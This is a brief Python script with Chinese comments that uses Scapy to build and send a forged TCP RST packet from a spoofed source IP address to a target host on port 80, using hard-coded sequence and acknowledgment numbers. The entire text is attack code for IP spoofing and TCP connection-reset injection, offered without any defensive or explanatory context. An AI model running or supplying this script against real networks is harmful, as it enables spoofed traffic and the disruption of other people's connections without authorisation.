from scapy.all import *
# 目標 IP 和偽造 IP 地址
target_ip = "192.168.2.100"
spoofed_ip = "192.168.2.222"
# 目標端口
target_port = 80
# 偽造的 TCP 序列號和確認號
seq = 12345
ack = 67890
# 構造偽造的 TCP RST 封包
rst_packet = IP(dst=target_ip, src=spoofed_ip) / TCP(dport=target_port, flags="R", seq=seq, ack=ack)
# 發送偽造的封包
send(rst_packet)
